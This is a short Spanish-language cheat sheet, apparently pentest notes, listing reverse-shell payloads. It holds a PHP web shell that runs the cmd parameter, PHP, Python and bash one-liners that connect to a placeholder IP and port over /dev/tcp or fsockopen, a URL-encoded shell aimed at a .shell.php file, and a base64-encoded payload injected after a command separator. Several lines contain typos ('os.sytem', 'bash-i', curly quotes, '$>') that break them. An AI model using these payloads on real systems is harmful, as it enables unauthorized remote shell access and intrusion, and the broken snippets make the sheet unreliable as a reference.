## Desde un archivo php

```bash
<?php

system($_GET[’cmd’]);

$>
```

## Desde la web con php (concatenada a un comando)

```bash
| php -r '$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);’
```

## Desde python

```bash
import os

os.sytem(”bash -c ‘exec bash -i &>/dev/tcp/IP/PORT <&1’”)
```

## Desde url

```bash
http://172.17.0.2/.shell.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/IP/PORT <%261’
```

## Encodeada de Base

```bash
echo “bash -i >& /dev/tcp/IP/PORT 0>&1” | base64 -w 0

test;echo <SHELL_CODEADA> | base64 -d | bash
```

## Desde bash

```bash
echo ‘bash -c “bash-i >& /dev/tcp/IP/PORT 0>&1”’ | bash
```

## Con archivo bash

```bash
#!/bin/bash

sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```
